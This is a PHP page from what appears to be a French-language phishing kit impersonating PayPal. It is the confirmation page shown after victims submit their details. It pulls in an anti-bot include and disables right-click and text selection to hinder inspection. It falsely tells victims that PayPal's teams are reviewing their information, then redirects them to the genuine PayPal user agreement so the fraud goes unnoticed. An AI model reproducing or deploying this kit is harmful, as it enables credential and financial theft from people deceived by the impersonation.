<?php 
ob_start();
session_start();
include '../antibots.php';
include '../config.php';
header('refresh:5;https://www.paypal.com/fr/webapps/mpp/ua/useragreement-full');
?>

<!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Merci d'avoir vérifier vos informations</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
            <script language="JavaScript1.2" type="text/javascript">
  //The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false 
        }
        
        function reEnable()
        {
                return true
        }
        
        //if IE4 
        // disable text selection
        document.onselectstart=new Function ("return false")
        
        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.
        
                document.onclick=reEnable
        }
        
        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }
        
        // disable right click
        document.oncontextmenu=new Function("return false")
        
</script>
        </head>
        <body>
<?php include'navbar.php'?>
            <div class="contain biling-p"> 
                <div class="contain-info">
                    <center>
                        <h3><P align=center>Votre compte est vérifié.</h3>
                        <img src="../img/tourne.gif" style="width: 170px;height: auto;margin-bottom:20px">
                    </center>
                    <h5 style="color:#676767"><P align=center>Vos informations sont en cours d'analyse par nos équipes.</h5>
                    <h5 style="color:#676767"><P align=center>Nous vous recontacterons en cas de soucis.</h5>
                    <center>
                        <h4 style="color:#676767">PayPal vous remercie.</h4>
                        <h4 style="color:#676767"></h4>
                        <h4 style="color:#676767">Redirection..</h4>
                        <h5 style="color:#676767;margin:20px auto"></h5>
                    </center>
                </div>
            </div>
<?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/cont.js"></script>
            <script src="../js/plugins.js"></script>
        </body>
    </html>